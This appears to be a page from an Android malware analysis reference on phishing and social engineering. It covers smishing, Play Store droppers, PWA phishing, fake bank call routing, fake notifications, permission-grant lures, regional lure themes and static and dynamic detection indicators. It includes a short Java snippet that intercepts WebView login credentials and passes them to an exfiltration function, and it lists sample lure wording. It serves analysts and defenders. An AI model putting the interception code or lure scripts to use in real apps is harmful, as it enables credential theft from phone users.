# Phishing & Social Engineering

Tricking Android users into installing malware, surrendering credentials, or granting dangerous permissions. Unlike technical exploits that target software flaws, phishing targets human trust. On Android, the attack surface is broader than on desktop: SMS messages, push notifications, phone calls, QR codes, and sideloaded APKs all serve as delivery mechanisms.

See also: [Call Interception](call-interception.md), [Notification Suppression](notification-suppression.md#fake-notification-injection), [Overlay Attacks](overlay-attacks.md)

!!! warning "Requirements"

    | Requirement | Details |
    |-------------|---------|
    | Permission | Varies by technique: [`SEND_SMS`](../permissions/sms/send-sms.md) for smishing propagation, [`SYSTEM_ALERT_WINDOW`](../permissions/special/system-alert-window.md) or [`BIND_ACCESSIBILITY_SERVICE`](../permissions/special/bind-accessibility-service.md) for overlay phishing |
    | Trigger | User interaction (tapping link, installing APK, granting permission) |
    | Payload | Phishing page (HTML/WebView), fake tutorial overlay, or social engineering script |

## Delivery Vectors

| Vector | Description | Reach | Example Families |
|--------|-------------|-------|-----------------|
| Smishing (SMS) | Bulk SMS with malicious links, often spoofing sender ID | Mass | [FluBot](../malware/families/flubot.md), [Mamont](../malware/families/mamont.md), [MoqHao](../malware/families/moqhao.md) |
| Play Store dropper | Benign app passes review, downloads malicious payload post-install | High trust | [Anatsa](../malware/families/anatsa.md), [Joker](../malware/families/joker.md), [Harly](../malware/families/harly.md) |
| Fake APK sites | Cloned Play Store pages or standalone download sites hosting trojanized APKs | Targeted | [GodFather](../malware/families/godfather.md), [SpyNote](../malware/families/spynote.md) |
| QR code phishing | Physical or digital QR codes leading to malicious download or credential page | In-person | [Anatsa](../malware/families/anatsa.md) variants |
| Malvertising | Ad networks serving redirects to phishing or APK download pages | Mass | [Vultur](../malware/families/vultur.md), [Brokewell](../malware/families/brokewell.md) |
| Messaging apps | Malicious links spread through WhatsApp, Telegram, or other messengers | Social graph | [FluBot](../malware/families/flubot.md), [GriftHorse](../malware/families/grifthorse.md) |

### Smishing in Detail

SMS phishing remains the dominant initial access vector. The attacker sends a text containing a shortened URL or a domain visually similar to a trusted brand. On Android, the SMS app renders URLs as tappable links with no reputation check by default.

[FluBot](../malware/families/flubot.md) weaponized this into a self-propagating worm: after infecting a device, it read the victim's contact list via [`READ_CONTACTS`](../permissions/contacts/read-contacts.md) and [`SEND_SMS`](../permissions/sms/send-sms.md), then sent smishing messages to every contact. At its peak in 2021, FluBot generated millions of SMS messages per day across Europe.

### Play Store Droppers

The dropper pattern: a clean app (typically a PDF reader, QR scanner, or file manager) passes Google Play Protect review. After installation, it either downloads a second-stage APK from C2 or uses `DexClassLoader` to load a malicious DEX payload. [Anatsa](../malware/families/anatsa.md) used this extensively throughout 2023-2024, with individual dropper apps reaching 100,000+ installs before removal.

## Credential Capture Techniques

### WebView-Based Fake Login Pages

The malware loads an attacker-controlled HTML page inside a `WebView`. The page mimics a banking app's login screen. Credentials entered into the form are captured via JavaScript interface or intercepted via `shouldOverrideUrlLoading()`.

??? example "WebView Credential Interception"

    ```java
    webView.setWebViewClient(new WebViewClient() {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            String url = request.getUrl().toString();
            if (url.contains("login_submit")) {
                Uri uri = request.getUrl();
                String user = uri.getQueryParameter("username");
                String pass = uri.getQueryParameter("password");
                exfilToC2(user, pass);
                return true;
            }
            return false;
        }
    });
    ```

### Overlay-Based Credential Capture

A fake UI drawn on top of the real banking app. Triggered when the target app reaches the foreground. Covered in depth in [Overlay Attacks](overlay-attacks.md).

### Progressive Web App (PWA) Phishing

!!! warning "PWAs bypass sideloading warnings entirely"

    The phishing page prompts the victim to "install" a Progressive Web App. The PWA is added to the home screen with a convincing icon and name (e.g., the victim's bank). When opened, it displays a full-screen credential harvesting form. PWAs install through the browser, so none of the standard APK sideloading protections apply. This technique was observed targeting Czech and Hungarian banking customers in 2024.

## Voice-Based Attacks

### Fake Call Interception

[Fakecalls](../malware/families/fakecalls.md) intercepts outgoing calls to real bank phone numbers. When the victim dials their bank, Fakecalls cancels the real call and plays a pre-recorded IVR (Interactive Voice Response) that sounds identical to the bank's phone system. The fake IVR prompts the victim to enter card details via the keypad, which the malware captures.

This requires [`CALL_PHONE`](../permissions/phone/call-phone.md), [`READ_PHONE_STATE`](../permissions/phone/read-phone-state.md), and the ability to detect outgoing calls. Targets Korean financial institutions.

### VoIP-Routed Vishing

LetsCAll malware routes all calls through attacker-controlled VoIP infrastructure. The victim believes they are speaking with their bank, but the call is handled by a human operator working for the attacker. This combines technical interception with live social engineering, making it harder to detect than pre-recorded approaches.

## Push Notification Phishing

Malware with [`BIND_NOTIFICATION_LISTENER_SERVICE`](../permissions/special/bind-notification-listener-service.md) can both read and generate push notifications. Attack pattern:

1. Generate a fake push notification mimicking the victim's bank ("Suspicious transaction detected -- verify now")
2. Notification tap opens a WebView credential harvesting page
3. Simultaneously suppress real banking notifications to avoid contradicting the fake alert

This is effective because users inherently trust push notifications from installed apps. [TrickMo](../malware/families/trickmo.md) and [GodFather](../malware/families/godfather.md) both use this technique.

## Social Engineering for Permission Grants

Obtaining dangerous permissions ([Accessibility](accessibility-abuse.md), Device Admin, Notification Listener) requires convincing the victim to manually toggle settings. Common strategies:

| Technique | Implementation | Target Permission |
|-----------|---------------|-------------------|
| Fake tutorial overlay | Step-by-step instructions drawn over Settings app | Accessibility |
| "Security update required" | Dialog claiming the OS needs an accessibility update | Accessibility |
| "Battery optimization" | Claims the app needs accessibility for battery management | Accessibility |
| "Enable notifications" | Tells user to enable notification access for "full functionality" | Notification Listener |
| "Device protection" | Prompts user to activate device admin for "anti-theft" | Device Admin |
| "Accessibility for disabled" | Poses as an assistive app that genuinely needs the permission | Accessibility |

!!! info "Origin of the fake tutorial technique"

    [Cerberus](../malware/families/cerberus.md) popularized the fake tutorial overlay -- it literally draws arrows and text boxes on top of the Settings screen, guiding the victim through each toggle. Most modern banking trojans have adopted variations of this technique.

## Lure Themes by Region

| Theme | Regions | Example Families |
|-------|---------|-----------------|
| Package delivery ("Your parcel is held") | Europe, Japan, Australia | [FluBot](../malware/families/flubot.md), [MoqHao](../malware/families/moqhao.md) |
| Bank security alert | Global | [GodFather](../malware/families/godfather.md), [Cerberus](../malware/families/cerberus.md), [Anubis](../malware/families/anubis.md) |
| Tax refund / government notice | US, UK, Germany, Japan | [Hydra](../malware/families/hydra.md) variants |
| Crypto airdrop / wallet verification | Global | [SpyAgent](../malware/families/spyagent.md), [SparkCat](../malware/families/sparkcat.md) |
| Voicemail notification | Europe, US | [FluBot](../malware/families/flubot.md) |
| Chrome / browser update | Global | [Hook](../malware/families/hook.md), [Brokewell](../malware/families/brokewell.md), [Vultur](../malware/families/vultur.md) |
| Flash Player update | Legacy (pre-2021) | [Anubis](../malware/families/anubis.md), [Cerberus](../malware/families/cerberus.md) |
| Video player / media codec | LATAM, Southeast Asia | [Gigabud](../malware/families/gigabud.md), [GoldPickaxe](../malware/families/goldpickaxe.md) |
| Government ID / MyGov | India, Thailand, Vietnam | [GoldPickaxe](../malware/families/goldpickaxe.md) |
| Subscription fraud lure | Global (Play Store) | [Joker](../malware/families/joker.md), [Harly](../malware/families/harly.md) |

Geographic targeting goes beyond translation. Regional campaigns match local carriers, banks, postal services, and government agencies. [GodFather](../malware/families/godfather.md) maintains localized phishing pages for banks across 16+ countries, dynamically selecting the inject based on device locale and installed banking apps.

## Families Using This Technique

| Family | Primary Vector | Lure | Scale |
|--------|---------------|------|-------|
| [FluBot](../malware/families/flubot.md) | SMS worm | Package delivery / voicemail | Millions of SMS/day at peak |
| [Fakecalls](../malware/families/fakecalls.md) | Fake APK site | Banking app clone | Targeted (Korea) |
| [Mamont](../malware/families/mamont.md) | SMS | Delivery tracking | Russia-focused |
| [GodFather](../malware/families/godfather.md) | Fake APK site + dropper | Banking / crypto | 400+ targets, 16+ countries |
| [Anatsa](../malware/families/anatsa.md) | Play Store dropper | PDF reader / cleaner | 100K+ installs per dropper |
| [Hook](../malware/families/hook.md) | Malvertising | Chrome update | 400+ targets |
| [Joker](../malware/families/joker.md) | Play Store dropper | Utility apps | Thousands of dropper apps |
| [GriftHorse](../malware/families/grifthorse.md) | Play Store + messenger | Prize / reward | 10M+ victims |
| [MoqHao](../malware/families/moqhao.md) | SMS | Package delivery | Japan, South Korea |
| [SpyNote](../malware/families/spynote.md) | Fake APK site | Utility / banking | Targeted campaigns |

## Common Phishing Flow

Typical end-to-end attack chain:

1. **Delivery**: victim receives smishing text ("Your package could not be delivered")
2. **Landing page**: link leads to a fake carrier site with "Download tracking app" button
3. **APK install**: victim enables [`REQUEST_INSTALL_PACKAGES`](../permissions/special/request-install-packages.md) for the browser and installs the APK
4. **Permission escalation**: app shows fake tutorial to enable [Accessibility](accessibility-abuse.md)
5. **Overlay injection**: malware detects banking app launch, shows [overlay](overlay-attacks.md) to capture credentials
6. **2FA interception**: accessibility or SMS permissions used to intercept OTP
7. **Account takeover**: credentials + OTP sent to C2, attacker logs in from their device

!!! tip "Analyst Note"

    Each step relies on social engineering rather than technical exploitation. The weakest link is always the initial tap on a link in a text message. When analyzing a sample, trace the full chain from delivery vector through permission escalation to understand the complete attack flow.

## Detection During Analysis

??? example "Static Indicators"

    - HTML files mimicking banking login pages in assets or downloaded to internal storage
    - Hardcoded SMS message templates with URL placeholders
    - `BroadcastReceiver` for `SMS_RECEIVED` or `WAP_PUSH_RECEIVED`
    - `TelephonyManager` or `CallScreeningService` usage for call interception
    - Localized string resources matching phishing lure themes

??? example "Dynamic Indicators"

    - Outbound SMS to numbers not in contacts (worm propagation)
    - WebView loading credential-harvesting URLs
    - Fake notifications generated matching banking app package names
    - Calls intercepted and rerouted through VoIP endpoints
